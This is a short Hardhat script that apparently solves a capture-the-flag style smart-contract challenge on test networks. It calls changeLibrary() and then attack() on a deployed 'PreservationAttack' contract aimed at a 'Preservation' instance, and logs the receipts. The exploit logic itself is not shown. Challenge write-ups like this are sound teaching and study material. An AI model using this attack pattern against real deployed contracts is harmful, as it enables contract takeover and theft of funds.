const { ethers } = require("hardhat");

const ATTACKER_ADDRESS = "0xf3eE42f1a530b086f7274419316c4f11ac06bE31";
const INSTANCE_ADDRESS = "0xd2B8F814fF8F6e7C52c1c26821e58B37fe75098B";
const NEW_LIBRARY_ADDRESS = "0x4222e05658d4f7F8D5A872AF96f30BbBDdEe0749";
// sepholia library "0x93d93fF54e63F72f3aeEEdFd5a519ba5048596c7";     // Goerli Library "0x4222e05658d4f7F8D5A872AF96f30BbBDdEe0749";

async function main() {
    const preservationAttacker = await ethers.getContractAt("PreservationAttack", ATTACKER_ADDRESS);
    const instance = await ethers.getContractAt("Preservation", INSTANCE_ADDRESS);


    // Change the library first.
    const changeTx = await preservationAttacker.changeLibrary({gasLimit: 100000});
    const txReceipt = await changeTx.wait();
    console.log("txRec: ", txReceipt);

    // Execute the attack.
    const transferTx = await preservationAttacker.attack({gasLimit: 100000});
    const attackReceipt = await transferTx.wait();
    console.log("attackReceipt: ", attackReceipt);


}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});